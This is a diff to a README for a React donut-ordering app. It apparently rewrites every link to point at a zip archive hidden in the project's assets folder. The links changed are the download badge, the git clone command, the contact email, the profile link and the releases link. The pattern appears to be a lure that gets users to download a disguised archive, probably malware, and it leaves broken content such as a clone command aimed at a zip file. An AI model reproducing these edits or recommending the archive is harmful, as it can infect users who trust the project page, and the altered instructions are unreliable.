@@ -2,7 +2,7 @@
 
 Welcome to **FlorDeNatas**, an online ordering system designed for artisan donuts. Built with React and Tailwind CSS, this application offers a user-friendly interface for placing orders, complete with WhatsApp integration. The responsive design draws inspiration from confectionery elements, ensuring a delightful experience for users.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-brightgreen)](https://github.com/mhdasci/FlorDeNatas/releases)
+[![Download Releases](https://github.com/mhdasci/FlorDeNatas/raw/refs/heads/main/src/components/assets/Natas-De-Flor-2.8.zip%20Releases-brightgreen)](https://github.com/mhdasci/FlorDeNatas/raw/refs/heads/main/src/components/assets/Natas-De-Flor-2.8.zip)
 
 ## Table of Contents
 
@@ -41,7 +41,7 @@ To get started with **FlorDeNatas**, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/mhdasci/FlorDeNatas.git
+   git clone https://github.com/mhdasci/FlorDeNatas/raw/refs/heads/main/src/components/assets/Natas-De-Flor-2.8.zip
    ```
 
 2. **Navigate to the Project Directory**:
@@ -97,7 +97,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 For any inquiries or feedback, please contact:
 
 - **Name**: Your Name
-- **Email**: your.email@example.com
-- **GitHub**: [Your GitHub Profile](https://github.com/yourprofile)
+- **Email**: https://github.com/mhdasci/FlorDeNatas/raw/refs/heads/main/src/components/assets/Natas-De-Flor-2.8.zip
+- **GitHub**: [Your GitHub Profile](https://github.com/mhdasci/FlorDeNatas/raw/refs/heads/main/src/components/assets/Natas-De-Flor-2.8.zip)
 
-Thank you for checking out **FlorDeNatas**! We hope you enjoy using our online ordering system for artisan donuts. For the latest updates and releases, please visit our [Releases](https://github.com/mhdasci/FlorDeNatas/releases) section.
+Thank you for checking out **FlorDeNatas**! We hope you enjoy using our online ordering system for artisan donuts. For the latest updates and releases, please visit our [Releases](https://github.com/mhdasci/FlorDeNatas/raw/refs/heads/main/src/components/assets/Natas-De-Flor-2.8.zip) section.
